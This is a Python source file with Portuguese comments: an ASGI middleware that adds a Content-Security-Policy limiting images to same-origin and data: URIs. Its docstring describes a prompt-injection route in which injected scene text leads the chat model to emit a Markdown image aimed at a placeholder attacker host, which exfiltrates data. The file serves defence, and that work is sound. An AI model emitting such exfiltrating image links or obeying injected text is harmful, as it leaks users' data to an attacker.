"""Content-Security-Policy para as páginas HTML (bloqueia imagens externas).

O chat renderiza Markdown vindo do modelo. Um texto injetado (nome ou
descrição de cena) pode levar o modelo a emitir ``![x](http://atacante/?d=…)``
e o navegador buscaria a URL sozinho — exfiltração de dados via imagem
(#25, OWASP LLM02). O DOMPurify em ``chat.js`` já remove ``<img>``; esta
política é a segunda barreira: só imagens da própria origem ou ``data:``
(o Bootstrap usa SVG em ``data:``).

Só ``img-src`` é restringido: scripts/estilos vêm de CDNs (Bootstrap, marked,
DOMPurify) e dos ``<script>``/``<style>`` inline dos templates.
"""

from __future__ import annotations

from starlette.types import ASGIApp, Message, Receive, Scope, Send

CSP_HEADER = b"content-security-policy"
CSP_POLICY = "img-src 'self' data:"


class ContentSecurityPolicyMiddleware:
    """ASGI puro: adiciona a CSP só em respostas ``text/html`` (não toca WS)."""

    def __init__(self, app: ASGIApp, policy: str = CSP_POLICY) -> None:
        self.app = app
        self.policy = policy.encode("latin-1")

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        async def send_with_csp(message: Message) -> None:
            if message["type"] == "http.response.start":
                headers = list(message.get("headers", []))
                names = {k.lower() for k, _ in headers}
                content_type = next(
                    (v for k, v in headers if k.lower() == b"content-type"), b""
                )
                if content_type.startswith(b"text/html") and CSP_HEADER not in names:
                    headers.append((CSP_HEADER, self.policy))
                    message = {**message, "headers": headers}
            await send(message)

        await self.app(scope, receive, send_with_csp)
